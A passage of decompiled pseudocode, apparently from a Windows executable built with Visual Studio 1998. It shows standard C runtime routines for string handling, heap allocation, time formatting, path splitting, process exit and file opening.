        goto LAB_00414d29;
      }
      *(char *)puVar5 = '\0';
      puVar5 = (uint *)((int)puVar5 + 1);
      _Count = _Count - 1;
    } while (_Count != 0);
    return _Dest;
  }
  uVar4 = _Count >> 2;
  if (uVar4 != 0) {
    do {
      uVar1 = *(uint *)_Source;
      uVar2 = *(uint *)_Source;
      _Source = (char *)((int)_Source + 4);
      if (((uVar1 ^ 0xffffffff ^ uVar1 + 0x7efefeff) & 0x81010100) != 0) {
        if ((char)uVar2 == '\0') {
          *puVar5 = 0;
joined_r0x00414d25:
          while( true ) {
            uVar4 = uVar4 - 1;
            puVar5 = puVar5 + 1;
            if (uVar4 == 0) break;
LAB_00414d29:
            *puVar5 = 0;
          }
          cVar3 = '\0';
          _Count = _Count & 3;
          if (_Count != 0) goto LAB_00414cbb;
          return _Dest;
        }
        if ((char)(uVar2 >> 8) == '\0') {
          *puVar5 = uVar2 & 0xff;
          goto joined_r0x00414d25;
        }
        if ((uVar2 & 0xff0000) == 0) {
          *puVar5 = uVar2 & 0xffff;
          goto joined_r0x00414d25;
        }
        if ((uVar2 & 0xff000000) == 0) {
          *puVar5 = uVar2;
          goto joined_r0x00414d25;
        }
      }
      *puVar5 = uVar2;
      puVar5 = puVar5 + 1;
      uVar4 = uVar4 - 1;
joined_r0x00414c7e:
    } while (uVar4 != 0);
    _Count = _Count & 3;
    if (_Count == 0) {
      return _Dest;
    }
  }
  do {
    cVar3 = (char)*(uint *)_Source;
    _Source = (char *)((int)_Source + 1);
    *(char *)puVar5 = cVar3;
    puVar5 = (uint *)((int)puVar5 + 1);
    if (cVar3 == '\0') {
      while (_Count = _Count - 1, _Count != 0) {
LAB_00414cbb:
        *(char *)puVar5 = cVar3;
        puVar5 = (uint *)((int)puVar5 + 1);
      }
      return _Dest;
    }
    _Count = _Count - 1;
  } while (_Count != 0);
  return _Dest;
}



/* VA 00414d40 */

void __cdecl FUN_00414d40(undefined *param_1)

{
  undefined *lpMem;
  byte *pbVar1;
  int local_4;

  lpMem = param_1;
  if (param_1 != (undefined *)0x0) {
    FUN_00417120(9);
    pbVar1 = (byte *)FUN_00417540(lpMem,&local_4,(uint *)&param_1);
    if (pbVar1 != (byte *)0x0) {
      FUN_004175a0(local_4,(int)param_1,pbVar1);
      FUN_004171a0(9);
      return;
    }
    FUN_004171a0(9);
    HeapFree(DAT_004313ac,0,lpMem);
  }
  return;
}



/* VA 00414db0 */

void __cdecl FUN_00414db0(uint param_1)

{
  FUN_00414dd0(param_1,DAT_0042ed34);
  return;
}



/* VA 00414dd0 */

int * __cdecl FUN_00414dd0(uint param_1,int param_2)

{
  int *piVar1;
  int iVar2;

  if (param_1 < 0xffffffe1) {
    if (param_1 == 0) {
      param_1 = 1;
    }
    do {
      if (param_1 < 0xffffffe1) {
        piVar1 = FUN_00414e20(param_1);
      }
      else {
        piVar1 = (int *)0x0;
      }
      if (piVar1 != (int *)0x0) {
        return piVar1;
      }
      if (param_2 == 0) {
        return (int *)0x0;
      }
      iVar2 = FUN_00417a90(param_1);
    } while (iVar2 != 0);
  }
  return (int *)0x0;
}



/* VA 00414e20 */

int * __cdecl FUN_00414e20(int param_1)

{
  int *piVar1;
  uint dwBytes;

  dwBytes = param_1 + 0xfU & 0xfffffff0;
  if (dwBytes <= DAT_0042ceec) {
    FUN_00417120(9);
    piVar1 = FUN_00417600(param_1 + 0xfU >> 4);
    FUN_004171a0(9);
    if (piVar1 != (int *)0x0) {
      return piVar1;
    }
  }
  piVar1 = HeapAlloc(DAT_004313ac,0,dwBytes);
  return piVar1;
}



/* VA 00414e80 */

int __cdecl FUN_00414e80(byte *param_1)

{
  byte bVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  int iVar5;
  byte *pbVar6;

  while( true ) {
    if (DAT_0042adcc < 2) {
      uVar2 = (byte)PTR_DAT_0042abc0[(uint)*param_1 * 2] & 8;
    }
    else {
      uVar2 = FUN_00415fc0((uint)*param_1,8);
    }
    if (uVar2 == 0) break;
    param_1 = param_1 + 1;
  }
  uVar2 = (uint)*param_1;
  pbVar6 = param_1 + 1;
  if ((uVar2 == 0x2d) || (uVar4 = uVar2, uVar2 == 0x2b)) {
    uVar4 = (uint)*pbVar6;
    pbVar6 = param_1 + 2;
  }
  iVar5 = 0;
  while( true ) {
    if (DAT_0042adcc < 2) {
      uVar3 = (byte)PTR_DAT_0042abc0[uVar4 * 2] & 4;
    }
    else {
      uVar3 = FUN_00415fc0(uVar4,4);
    }
    if (uVar3 == 0) break;
    bVar1 = *pbVar6;
    pbVar6 = pbVar6 + 1;
    iVar5 = (uVar4 - 0x30) + iVar5 * 10;
    uVar4 = (uint)bVar1;
  }
  if (uVar2 == 0x2d) {
    iVar5 = -iVar5;
  }
  return iVar5;
}



/* VA 00414f30 */

uint __cdecl FUN_00414f30(uint param_1)

{
  bool bVar1;

  if (DAT_0042ed50 == 0) {
    if ((0x40 < (int)param_1) && ((int)param_1 < 0x5b)) {
      return param_1 + 0x20;
    }
  }
  else {
    InterlockedIncrement((LONG *)&DAT_004313a8);
    bVar1 = DAT_004313a4 != 0;
    if (bVar1) {
      InterlockedDecrement((LONG *)&DAT_004313a8);
      FUN_00417120(0x13);
    }
    param_1 = FUN_00414fc0(param_1);
    if (bVar1) {
      FUN_004171a0(0x13);
      return param_1;
    }
    InterlockedDecrement((LONG *)&DAT_004313a8);
  }
  return param_1;
}



/* VA 00414fc0 */

uint __cdecl FUN_00414fc0(uint param_1)

{
  uint uVar1;
  uint uVar2;
  LPCWSTR pWVar3;
  int iVar4;
  uint local_8 [2];

  uVar1 = param_1;
  if (DAT_0042ed50 == 0) {
    if ((0x40 < (int)param_1) && ((int)param_1 < 0x5b)) {
      return param_1 + 0x20;
    }
  }
  else {
    if ((int)param_1 < 0x100) {
      if (DAT_0042adcc < 2) {
        uVar2 = (byte)PTR_DAT_0042abc0[param_1 * 2] & 1;
      }
      else {
        uVar2 = FUN_00415fc0(param_1,1);
      }
      if (uVar2 == 0) {
        return uVar1;
      }
    }
    uVar2 = param_1;
    if ((PTR_DAT_0042abc0[((int)uVar1 >> 8 & 0xffU) * 2 + 1] & 0x80) == 0) {
      param_1._0_2_ = (ushort)(byte)uVar1;
      pWVar3 = (LPCWSTR)0x1;
    }
    else {
      param_1._0_2_ = CONCAT11((byte)uVar1,(char)(uVar1 >> 8));
      param_1._3_1_ = SUB41(uVar2,3);
      param_1._0_3_ = (uint3)(ushort)param_1;
      pWVar3 = (LPCWSTR)0x2;
    }
    iVar4 = FUN_00417b00(DAT_0042ed50,0x100,(char *)&param_1,pWVar3,(LPWSTR)local_8,3,0);
    if (iVar4 == 0) {
      return uVar1;
    }
    if (iVar4 == 1) {
      return local_8[0] & 0xff;
    }
    param_1 = (local_8[0] >> 8 & 0xff) << 8 | local_8[0] & 0xff;
  }
  return param_1;
}



/* VA 00415320 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void __cdecl FUN_00415320(int *param_1)

{
  DWORD DVar1;
  int iVar2;
  _SYSTEMTIME local_cc;
  _SYSTEMTIME local_bc;
  _TIME_ZONE_INFORMATION local_ac;

  GetLocalTime(&local_bc);
  GetSystemTime(&local_cc);
  if (local_cc.wMinute == DAT_0042ec5a) {
    if (local_cc.wHour == DAT_0042ec58) {
      if (local_cc.wDay == DAT_0042ec56) {
        if (local_cc.wMonth == DAT_0042ec52) {
          if (local_cc.wYear == DAT_0042ec50) goto LAB_004153ef;
        }
      }
    }
  }
  DVar1 = GetTimeZoneInformation(&local_ac);
  if (DVar1 == 0xffffffff) {
    DAT_0042ec48 = -1;
  }
  else if (((DVar1 == 2) && (local_ac.DaylightDate.wMonth != 0)) && (local_ac.DaylightBias != 0)) {
    DAT_0042ec48 = 1;
  }
  else {
    DAT_0042ec48 = 0;
  }
  DAT_0042ec50 = local_cc.wYear;
  DAT_0042ec52 = local_cc.wMonth;
  _DAT_0042ec54 = local_cc.wDayOfWeek;
  DAT_0042ec56 = local_cc.wDay;
  DAT_0042ec58 = local_cc.wHour;
  DAT_0042ec5a = local_cc.wMinute;
  _DAT_0042ec5c = local_cc.wSecond;
  DAT_0042ec5c_2 = local_cc.wMilliseconds;
LAB_004153ef:
  iVar2 = FUN_00418a00((uint)local_bc.wYear,(uint)local_bc.wMonth,(uint)local_bc.wDay,
                       (uint)local_bc.wHour,(uint)local_bc.wMinute,(uint)local_bc.wSecond,
                       DAT_0042ec48);
  if (param_1 != (int *)0x0) {
    *param_1 = iVar2;
  }
  return;
}



/* VA 00415450 */

/* Library Function - Single Match
    _strrchr

   Libraries: Visual Studio 1998 Debug, Visual Studio 1998 Release */

char * __cdecl _strrchr(char *_Str,int _Ch)

{
  char cVar1;
  int iVar2;
  char *pcVar3;
  char *pcVar4;

  iVar2 = -1;
  do {
    pcVar4 = _Str;
    if (iVar2 == 0) break;
    iVar2 = iVar2 + -1;
    pcVar4 = _Str + 1;
    cVar1 = *_Str;
    _Str = pcVar4;
  } while (cVar1 != '\0');
  iVar2 = -(iVar2 + 1);
  pcVar4 = pcVar4 + -1;
  do {
    pcVar3 = pcVar4;
    if (iVar2 == 0) break;
    iVar2 = iVar2 + -1;
    pcVar3 = pcVar4 + -1;
    cVar1 = *pcVar4;
    pcVar4 = pcVar3;
  } while ((char)_Ch != cVar1);
  pcVar3 = pcVar3 + 1;
  if (*pcVar3 != (char)_Ch) {
    pcVar3 = (char *)0x0;
  }
  return pcVar3;
}



/* VA 00415490 */

/* Library Function - Single Match
    _strchr

   Libraries: Visual Studio 1998 Debug, Visual Studio 1998 Release */

char * __cdecl _strchr(char *_Str,int _Val)

{
  uint uVar1;
  char cVar2;
  uint uVar3;
  uint uVar4;
  uint *puVar5;

  while (((uint)_Str & 3) != 0) {
    uVar1 = *(uint *)_Str;
    if ((char)uVar1 == (char)_Val) {
      return (char *)(uint *)_Str;
    }
    _Str = (char *)((int)_Str + 1);
    if ((char)uVar1 == '\0') {
      return (char *)0x0;
    }
  }
  while( true ) {
    while( true ) {
      uVar1 = *(uint *)_Str;
      uVar4 = uVar1 ^ CONCAT22(CONCAT11((char)_Val,(char)_Val),CONCAT11((char)_Val,(char)_Val));
      uVar3 = uVar1 ^ 0xffffffff ^ uVar1 + 0x7efefeff;
      puVar5 = (uint *)((int)_Str + 4);
      if (((uVar4 ^ 0xffffffff ^ uVar4 + 0x7efefeff) & 0x81010100) != 0) break;
      _Str = (char *)puVar5;
      if ((uVar3 & 0x81010100) != 0) {
        if ((uVar3 & 0x1010100) != 0) {
          return (char *)0x0;
        }
        if ((uVar1 + 0x7efefeff & 0x80000000) == 0) {
          return (char *)0x0;
        }
      }
    }
    uVar1 = *(uint *)_Str;
    if ((char)uVar1 == (char)_Val) {
      return (char *)(uint *)_Str;
    }
    if ((char)uVar1 == '\0') {
      return (char *)0x0;
    }
    cVar2 = (char)(uVar1 >> 8);
    if (cVar2 == (char)_Val) {
      return (char *)((int)_Str + 1);
    }
    if (cVar2 == '\0') {
      return (char *)0x0;
    }
    cVar2 = (char)(uVar1 >> 0x10);
    if (cVar2 == (char)_Val) {
      return (char *)((int)_Str + 2);
    }
    if (cVar2 == '\0') break;
    cVar2 = (char)(uVar1 >> 0x18);
    if (cVar2 == (char)_Val) {
      return (char *)((int)_Str + 3);
    }
    _Str = (char *)puVar5;
    if (cVar2 == '\0') {
      return (char *)0x0;
    }
  }
  return (char *)0x0;
}



/* VA 004157f0 */

void FUN_004157f0(void)

{
  if (DAT_004313bc != (code *)0x0) {
    (*DAT_004313bc)();
  }
  FUN_00415940((undefined4 *)&DAT_00429008,(undefined4 *)&DAT_00429014);
  FUN_00415940((undefined4 *)&DAT_00429000,(undefined4 *)&DAT_00429004);
  return;
}



/* VA 00415820 */

void __cdecl FUN_00415820(UINT param_1)

{
  FUN_00415860(param_1,0,0);
  return;
}



/* VA 00415840 */

/* Library Function - Single Match
    __exit

   Library: Visual Studio 1998 Release */

void __cdecl __exit(int _Code)

{
  FUN_00415860(_Code,1,0);
  return;
}



/* VA 00415860 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void __cdecl FUN_00415860(UINT param_1,int param_2,int param_3)

{
  HANDLE hProcess;
  undefined4 *puVar1;
  undefined4 *puVar2;
  UINT uExitCode;

  FUN_00415920();
  if (DAT_0042eca0 == 1) {
    uExitCode = param_1;
    hProcess = GetCurrentProcess();
    TerminateProcess(hProcess,uExitCode);
  }
  _DAT_0042ec9c = 1;
  DAT_0042ec98 = (undefined1)param_3;
  if (param_2 == 0) {
    if ((DAT_004313b8 != (undefined4 *)0x0) &&
       (puVar2 = (undefined4 *)(DAT_004313b4 + -4), puVar1 = DAT_004313b8, DAT_004313b8 <= puVar2))
    {
      do {
        if ((code *)*puVar2 != (code *)0x0) {
          (*(code *)*puVar2)();
          puVar1 = DAT_004313b8;
        }
        puVar2 = puVar2 + -1;
      } while (puVar1 <= puVar2);
    }
    FUN_00415940((undefined4 *)&DAT_00429018,(undefined4 *)&DAT_00429020);
  }
  FUN_00415940((undefined4 *)&DAT_00429024,(undefined4 *)&DAT_00429028);
  if (param_3 != 0) {
    FUN_00415930();
    return;
  }
  DAT_0042eca0 = 1;
                    /* WARNING: Subroutine does not return */
  ExitProcess(param_1);
}



/* VA 00415920 */

void FUN_00415920(void)

{
  FUN_00417120(0xd);
  return;
}



/* VA 00415930 */

void FUN_00415930(void)

{
  FUN_004171a0(0xd);
  return;
}



/* VA 00415940 */

void __cdecl FUN_00415940(undefined4 *param_1,undefined4 *param_2)

{
  for (; param_1 < param_2; param_1 = param_1 + 1) {
    if ((code *)*param_1 != (code *)0x0) {
      (*(code *)*param_1)();
    }
  }
  return;
}



/* VA 00415960 */

/* Library Function - Single Match
    _strncmp

   Libraries: Visual Studio 1998 Debug, Visual Studio 1998 Release */

int __cdecl _strncmp(char *_Str1,char *_Str2,size_t _MaxCount)

{
  char cVar1;
  char cVar2;
  size_t sVar3;
  int iVar4;
  uint uVar5;
  char *pcVar6;
  char *pcVar7;

  uVar5 = 0;
  sVar3 = _MaxCount;
  pcVar6 = _Str1;
  if (_MaxCount != 0) {
    do {
      if (sVar3 == 0) break;
      sVar3 = sVar3 - 1;
      cVar1 = *pcVar6;
      pcVar6 = pcVar6 + 1;
    } while (cVar1 != '\0');
    iVar4 = _MaxCount - sVar3;
    do {
      pcVar6 = _Str2;
      pcVar7 = _Str1;
      if (iVar4 == 0) break;
      iVar4 = iVar4 + -1;
      pcVar7 = _Str1 + 1;
      pcVar6 = _Str2 + 1;
      cVar2 = *_Str1;
      cVar1 = *_Str2;
      _Str2 = pcVar6;
      _Str1 = pcVar7;
    } while (cVar1 == cVar2);
    uVar5 = 0;
    if ((byte)pcVar6[-1] <= (byte)pcVar7[-1]) {
      if (pcVar6[-1] == pcVar7[-1]) {
        return 0;
      }
      uVar5 = 0xfffffffe;
    }
    uVar5 = ~uVar5;
  }
  return uVar5;
}



/* VA 004159a0 */

/* WARNING: Unable to track spacebase fully for stack */

void FUN_004159a0(void)

{
  uint in_EAX;
  undefined1 *puVar1;
  undefined4 unaff_retaddr;

  puVar1 = &stack0x00000004;
  for (; 0xfff < in_EAX; in_EAX = in_EAX - 0x1000) {
    puVar1 = puVar1 + -0x1000;
  }
  *(undefined4 *)(puVar1 + (-4 - in_EAX)) = unaff_retaddr;
  return;
}



/* VA 00415c40 */

undefined1 * __cdecl FUN_00415c40(int *param_1)

{
  int iVar1;
  int iVar2;
  DWORD *pDVar3;
  DWORD DVar4;
  char *pcVar5;
  char *pcVar6;
  char *pcVar7;
  int iVar8;
  int iVar9;

  pDVar3 = FUN_00419530();
  if (pDVar3[0xe] == 0) {
    DVar4 = FUN_00414db0(0x1a);
    pDVar3[0xe] = DVar4;
    pcVar5 = &DAT_0042eca8;
    if (DVar4 == 0) goto LAB_00415c6b;
  }
  pcVar5 = (char *)pDVar3[0xe];
LAB_00415c6b:
  iVar1 = param_1[6];
  iVar2 = param_1[4];
  pcVar7 = pcVar5;
  iVar8 = 0;
  do {
    pcVar6 = pcVar7;
    iVar9 = iVar8 + 1;
    *pcVar6 = "SunMonTueWedThuFriSat"[iVar1 * 3 + iVar8];
    pcVar6[4] = "JanFebMarAprMayJunJulAugSepOctNovDec"[iVar2 * 3 + iVar8];
    pcVar7 = pcVar6 + 1;
    iVar8 = iVar9;
  } while (iVar9 < 3);
  pcVar6[1] = ' ';
  pcVar6[5] = ' ';
  pcVar7 = FUN_00415d30(pcVar6 + 6,param_1[3]);
  *pcVar7 = ' ';
  pcVar7 = FUN_00415d30(pcVar7 + 1,param_1[2]);
  *pcVar7 = ':';
  pcVar7 = FUN_00415d30(pcVar7 + 1,param_1[1]);
  *pcVar7 = ':';
  pcVar7 = FUN_00415d30(pcVar7 + 1,*param_1);
  *pcVar7 = ' ';
  pcVar7 = FUN_00415d30(pcVar7 + 1,param_1[5] / 100 + 0x13);
  pcVar7 = FUN_00415d30(pcVar7,param_1[5] % 100);
  *pcVar7 = '\n';
  pcVar7[1] = '\0';
  return pcVar5;
}



/* VA 00415d30 */

char * __cdecl FUN_00415d30(char *param_1,int param_2)

{
  *param_1 = (((char)(param_2 / 10) + (char)(param_2 >> 0x1f)) -
             (char)((longlong)param_2 * 0x66666667 >> 0x3f)) + '0';
  param_1[1] = (char)(param_2 % 10) + '0';
  return param_1 + 2;
}



/* VA 00415d70 */

tm * __cdecl FUN_00415d70(int *param_1)

{
  int *piVar1;
  tm *ptVar2;
  int iVar3;
  int iVar4;

  piVar1 = param_1;
  if (*param_1 < 0) {
    return (tm *)0x0;
  }
  FUN_004195b0();
  iVar3 = *piVar1;
  if ((iVar3 < 0x3f481) || (0x7ffc0b7e < iVar3)) {
    ptVar2 = (tm *)FUN_00419d10(piVar1);
    iVar4 = __isindst(ptVar2);
    iVar3 = ptVar2->tm_sec;
    if (iVar4 != 0) {
      iVar3 = iVar3 - DAT_0042d448;
    }
    param_1 = (int *)(iVar3 - DAT_0042d440);
    iVar3 = (int)param_1 % 0x3c;
    ptVar2->tm_sec = iVar3;
    if (iVar3 < 0) {
      ptVar2->tm_sec = iVar3 + 0x3c;
      param_1 = param_1 + -0xf;
    }
    param_1 = (int *)((int)param_1 / 0x3c + ptVar2->tm_min);
    iVar3 = (int)param_1 % 0x3c;
    ptVar2->tm_min = iVar3;
    if (iVar3 < 0) {
      ptVar2->tm_min = iVar3 + 0x3c;
      param_1 = param_1 + -0xf;
    }
    param_1 = (int *)((int)param_1 / 0x3c + ptVar2->tm_hour);
    iVar3 = (int)param_1 % 0x18;
    ptVar2->tm_hour = iVar3;
    if (iVar3 < 0) {
      ptVar2->tm_hour = iVar3 + 0x18;
      param_1 = param_1 + -6;
    }
    iVar3 = (int)param_1 / 0x18;
    if (0 < iVar3) {
      ptVar2->tm_wday = (iVar3 + ptVar2->tm_wday) % 7;
      ptVar2->tm_mday = ptVar2->tm_mday + iVar3;
      ptVar2->tm_yday = ptVar2->tm_yday + iVar3;
      return ptVar2;
    }
    if (iVar3 < 0) {
      ptVar2->tm_wday = (iVar3 + 7 + ptVar2->tm_wday) % 7;
      iVar4 = ptVar2->tm_mday + iVar3;
      ptVar2->tm_mday = iVar4;
      if (iVar4 < 1) {
        ptVar2->tm_yday = 0x16c;
        ptVar2->tm_mday = iVar4 + 0x1f;
        ptVar2->tm_mon = 0xb;
        ptVar2->tm_year = ptVar2->tm_year + -1;
        return ptVar2;
      }
      ptVar2->tm_yday = ptVar2->tm_yday + iVar3;
    }
  }
  else {
    param_1 = (int *)(iVar3 - DAT_0042d440);
    ptVar2 = (tm *)FUN_00419d10((int *)&param_1);
    if (DAT_0042d444 != 0) {
      iVar3 = __isindst(ptVar2);
      if (iVar3 != 0) {
        param_1 = (int *)((int)param_1 - DAT_0042d448);
        ptVar2 = (tm *)FUN_00419d10((int *)&param_1);
        ptVar2->tm_isdst = 1;
        return ptVar2;
      }
    }
  }
  return ptVar2;
}



/* VA 00415fc0 */

uint __cdecl FUN_00415fc0(int param_1,uint param_2)

{
  int iVar1;
  BOOL BVar2;
  uint local_4;

  iVar1 = param_1;
  if (param_1 + 1U < 0x101) {
    return *(ushort *)(PTR_DAT_0042abc0 + param_1 * 2) & param_2;
  }
  if ((PTR_DAT_0042abc0[(param_1 >> 8 & 0xffU) * 2 + 1] & 0x80) == 0) {
    param_1._0_2_ = (ushort)(byte)param_1;
    iVar1 = 1;
  }
  else {
    param_1._0_2_ = CONCAT11((byte)param_1,(char)((uint)param_1 >> 8));
    param_1._3_1_ = SUB41(iVar1,3);
    param_1._0_3_ = (uint3)(ushort)param_1;
    iVar1 = 2;
  }
  BVar2 = FUN_0041a2c0(1,(LPCSTR)&param_1,iVar1,(LPWORD)&local_4,0,0);
  if (BVar2 == 0) {
    return 0;
  }
  return local_4 & 0xffff & param_2;
}



/* VA 00416160 */

void __cdecl FUN_00416160(byte *param_1,byte *param_2,byte *param_3,byte *param_4,byte *param_5)

{
  byte *pbVar1;
  byte bVar2;
  uint uVar3;
  int iVar4;
  byte *pbVar5;
  byte *local_4;

  iVar4 = -1;
  pbVar5 = param_1;
  do {
    if (iVar4 == 0) break;
    iVar4 = iVar4 + -1;
    bVar2 = *pbVar5;
    pbVar5 = pbVar5 + 1;
  } while (bVar2 != 0);
  local_4 = (byte *)0x0;
  if ((iVar4 == -2) || (param_1[1] != 0x3a)) {
    if (param_2 != (byte *)0x0) {
      *param_2 = 0;
    }
  }
  else {
    if (param_2 != (byte *)0x0) {
      FUN_0041a700(param_2,param_1,2);
      param_2[2] = 0;
    }
    param_1 = param_1 + 2;
  }
  bVar2 = *param_1;
  param_2 = (byte *)0x0;
  pbVar5 = param_1;
  while (bVar2 != 0) {
    bVar2 = *pbVar5;
    if ((*(byte *)((int)&DAT_0042ee60 + bVar2 + 1) & 4) == 0) {
      if ((bVar2 == 0x2f) || (bVar2 == 0x5c)) {
        param_2 = pbVar5 + 1;
      }
      else if (bVar2 == 0x2e) {
        local_4 = pbVar5;
      }
    }
    else {
      pbVar5 = pbVar5 + 1;
    }
    pbVar1 = pbVar5 + 1;
    pbVar5 = pbVar5 + 1;
    bVar2 = *pbVar1;
  }
  if (param_2 == (byte *)0x0) {
    param_2 = param_1;
    if (param_3 != (byte *)0x0) {
      *param_3 = 0;
    }
  }
  else if (param_3 != (byte *)0x0) {
    uVar3 = (int)param_2 - (int)param_1;
    if (0xfe < uVar3) {
      uVar3 = 0xff;
    }
    FUN_0041a700(param_3,param_1,uVar3);
    param_3[uVar3] = 0;
  }
  if ((local_4 == (byte *)0x0) || (local_4 < param_2)) {
    if (param_4 != (byte *)0x0) {
      uVar3 = (int)pbVar5 - (int)param_2;
      if (0xfe < uVar3) {
        uVar3 = 0xff;
      }
      FUN_0041a700(param_4,param_2,uVar3);
      param_4[uVar3] = 0;
    }
    if (param_5 != (byte *)0x0) {
      *param_5 = 0;
    }
  }
  else {
    if (param_4 != (byte *)0x0) {
      uVar3 = (int)local_4 - (int)param_2;
      if (0xfe < uVar3) {
        uVar3 = 0xff;
      }
      FUN_0041a700(param_4,param_2,uVar3);
      param_4[uVar3] = 0;
    }
    if (param_5 != (byte *)0x0) {
      uVar3 = (int)pbVar5 - (int)local_4;
      if (0xfe < uVar3) {
        uVar3 = 0xff;
      }
      FUN_0041a700(param_5,local_4,uVar3);
      param_5[uVar3] = 0;
      return;
    }
  }
  return;
}



/* VA 004162e0 */

int __cdecl FUN_004162e0(short *param_1)

{
  short sVar1;
  short *psVar2;

  sVar1 = *param_1;
  psVar2 = param_1;
  while (psVar2 = psVar2 + 1, sVar1 != 0) {
    sVar1 = *psVar2;
  }
  return ((int)psVar2 - (int)param_1 >> 1) + -1;
}



/* VA 004163a0 */

undefined4 __cdecl FUN_004163a0(uint param_1)

{
  undefined4 uVar1;
  DWORD *pDVar2;

  if ((param_1 < DAT_00430380) &&
     ((*(byte *)((&DAT_00430280)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 0x24) & 1) != 0)) {
    FUN_0041ab50(param_1);
    uVar1 = FUN_00416410(param_1);
    FUN_0041abc0(param_1);
    return uVar1;
  }
  pDVar2 = FUN_00419020();
  *pDVar2 = 9;
  pDVar2 = FUN_00419030();
  *pDVar2 = 0;
  return 0xffffffff;
}



/* VA 00416410 */

undefined4 __cdecl FUN_00416410(uint param_1)

{
  int iVar1;
  int iVar2;
  HANDLE hObject;
  BOOL BVar3;
  undefined *puVar4;

  iVar1 = FUN_0041ab00(param_1);
  if (iVar1 != -1) {
    if ((param_1 == 1) || (param_1 == 2)) {
      iVar1 = FUN_0041ab00(1);
      iVar2 = FUN_0041ab00(2);
      if (iVar1 == iVar2) goto LAB_00416466;
    }
    hObject = (HANDLE)FUN_0041ab00(param_1);
    BVar3 = CloseHandle(hObject);
    if (BVar3 == 0) {
      puVar4 = (undefined *)GetLastError();
      goto LAB_00416468;
    }
  }
LAB_00416466:
  puVar4 = (undefined *)0x0;
LAB_00416468:
  FUN_0041aa60(param_1);
  *(undefined1 *)((&DAT_00430280)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 0x24) = 0;
  if (puVar4 != (undefined *)0x0) {
    FUN_00418fa0(puVar4);
    return 0xffffffff;
  }
  return 0;
}



/* VA 004164c0 */

uint __cdecl FUN_004164c0(LPCSTR param_1,uint param_2,uint param_3,undefined4 param_4)

{
  uint uVar1;
  HANDLE hFile;
  undefined *puVar2;
  int iVar3;
  DWORD *pDVar4;
  DWORD DVar5;
  DWORD dwCreationDisposition;
  DWORD dwFlagsAndAttributes;
  int iVar6;
  bool bVar7;
  byte local_11;
  uint local_10;
  _SECURITY_ATTRIBUTES local_c;

  bVar7 = (param_2 & 0x80) == 0;
  local_c.nLength = 0xc;
  local_c.lpSecurityDescriptor = (LPVOID)0x0;
  if (bVar7) {
    local_11 = 0;
  }
  else {
    local_11 = 0x10;
  }
  local_c.bInheritHandle = (BOOL)bVar7;
  if (((param_2 & 0x8000) == 0) && (((param_2 & 0x4000) != 0 || (DAT_0042ef80 != 0x8000)))) {
    local_11 = local_11 | 0x80;
  }
  uVar1 = param_2 & 3;
  if (uVar1 == 0) {
    local_10 = 0x80000000;
  }
  else if (uVar1 == 1) {
    local_10 = 0x40000000;
  }
  else {
    if (uVar1 != 2) goto switchD_00416558_caseD_11;
    local_10 = 0xc0000000;
  }
  switch(param_3) {
  case 0x10:
    DVar5 = 0;
    break;
  default:
    goto switchD_00416558_caseD_11;
  case 0x20:
    DVar5 = 1;
    break;
  case 0x30:
    DVar5 = 2;
    break;
  case 0x40:
    DVar5 = 3;
  }
  uVar1 = param_2 & 0x700;
  if (uVar1 < 0x101) {
    if (uVar1 == 0x100) {
      dwCreationDisposition = 4;
    }
    else {
      if (uVar1 != 0) goto switchD_00416558_caseD_11;
LAB_004165c6:
      dwCreationDisposition = 3;
    }
  }
  else if (uVar1 < 0x301) {
    if (uVar1 == 0x300) {
      dwCreationDisposition = 2;
    }
    else {
      if (uVar1 != 0x200) goto switchD_00416558_caseD_11;
LAB_004165e6:
      dwCreationDisposition = 5;
    }
  }
  else {
    if (uVar1 < 0x501) {
      if (uVar1 != 0x500) {
        if (uVar1 != 0x400) {
switchD_00416558_caseD_11:
          pDVar4 = FUN_00419020();
          *pDVar4 = 0x16;
          pDVar4 = FUN_00419030();
          *pDVar4 = 0;
          return 0xffffffff;
        }
        goto LAB_004165c6;
      }
    }
    else {
      if (uVar1 == 0x600) goto LAB_004165e6;
      if (uVar1 != 0x700) goto switchD_00416558_caseD_11;
    }
    dwCreationDisposition = 1;
  }
  dwFlagsAndAttributes = 0x80;
  if (((param_2 & 0x100) != 0) && (((byte)param_4 & ~(byte)DAT_0042ec60 & 0x80) == 0)) {
    dwFlagsAndAttributes = 1;
  }
  if ((param_2 & 0x40) != 0) {
    dwFlagsAndAttributes = dwFlagsAndAttributes | 0x4000000;
    local_10 = local_10 | 0x10000;
  }
  if ((param_2 & 0x1000) != 0) {
    dwFlagsAndAttributes = dwFlagsAndAttributes | 0x100;
  }
  if ((param_2 & 0x20) == 0) {
    if ((param_2 & 0x10) != 0) {
      dwFlagsAndAttributes = dwFlagsAndAttributes | 0x10000000;
    }
  }
  else {
    dwFlagsAndAttributes = dwFlagsAndAttributes | 0x8000000;
  }
  uVar1 = FUN_0041a840();
  if (uVar1 == 0xffffffff) {
    pDVar4 = FUN_00419020();
    *pDVar4 = 0x18;
    pDVar4 = FUN_00419030();
    *pDVar4 = 0;
    return 0xffffffff;
  }
  hFile = CreateFileA(param_1,local_10,DVar5,&local_c,dwCreationDisposition,dwFlagsAndAttributes,
                      (HANDLE)0x0);
  if (hFile != (HANDLE)0xffffffff) {
    DVar5 = GetFileType(hFile);
    if (DVar5 != 0) {
      if (DVar5 == 2) {
        local_11 = local_11 | 0x40;
      }
      else if (DVar5 == 3) {
        local_11 = local_11 | 8;
      }
      FUN_0041a9b0(uVar1,hFile);
      iVar6 = (uVar1 & 0x1f) * 0x24;
      *(byte *)(iVar6 + 4 + (&DAT_00430280)[(int)uVar1 >> 5]) = local_11 | 1;
      if ((((local_11 & 0x48) == 0) && ((local_11 & 0x80) != 0)) && ((param_2 & 2) != 0)) {
        DVar5 = FUN_004190c0(uVar1,-1,2);
        if (DVar5 == 0xffffffff) {
          pDVar4 = FUN_00419030();
          if (*pDVar4 != 0x83) {
LAB_004167a6:
            FUN_004163a0(uVar1);
            FUN_0041abc0(uVar1);
            return 0xffffffff;
          }
        }
        else {
          param_3 = param_3 & 0xffffff00;
          iVar3 = FUN_0041af50(uVar1,(char *)&param_3,1);
          if ((((iVar3 == 0) && ((char)param_3 == '\x1a')) && (iVar3 = FUN_0041ae00(), iVar3 == -1))
